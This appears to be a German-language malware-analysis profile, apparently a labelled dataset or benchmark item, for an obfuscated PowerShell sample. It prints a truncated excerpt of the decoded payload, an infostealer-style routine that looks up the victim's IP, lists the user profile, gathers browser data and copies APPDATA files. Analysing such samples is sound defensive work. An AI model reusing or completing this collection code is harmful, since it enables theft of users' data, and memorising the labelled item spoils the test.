# Steckbrief: tech_038_Moar64.ps1

- SHA256: `1fec9d5392fbf24a9f5f894b3013c448386df2b0d53274221d9a830b789a48b7`
- Groesse: 12429 Bytes, 2 Zeilen
- Ground-Truth-Label (aus Ordner): **techniques**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 0 (Auszug unten)
- Base64-Bloecke gesamt: 1, davon dekodierbar: 1
- Dekodierter Base64-Block (Laenge 12428):
  ```
  function AR {
    param (
        [string]$wh
    )

    $ipInfoApiUrl = "http://ip-api.com/json"
    $outputFile = "$env:TEMP\AR.txt"
    $browserDataFile = "$env:TEMP\BrowserData.txt" 

    function Get-AdditionalData {
        param (
            [string]$FolderName
        )

        tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt

        Copy-Item "$env:APPDATA\Microsoft\Window
  ```

## Stufe 2 - Statische Merkmale (zusaetzlich)

## Stufe 3 - Struktur (zusaetzlich)
- Dekodierte Befehle (Auszug):
  ```
  function AR {
    param (
        [string]$wh
    )

    $ipInfoApiUrl = "http://ip-api.com/json"
    $outputFile = "$env:TEMP\AR.txt"
    $browserDataFile = "$env:TEMP\BrowserData.txt" 

    function Get-AdditionalData {
        param (
            [string]$FolderName
        )

        tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt

        Copy-Item "$env:APPDATA\Microsoft\Window
  ```
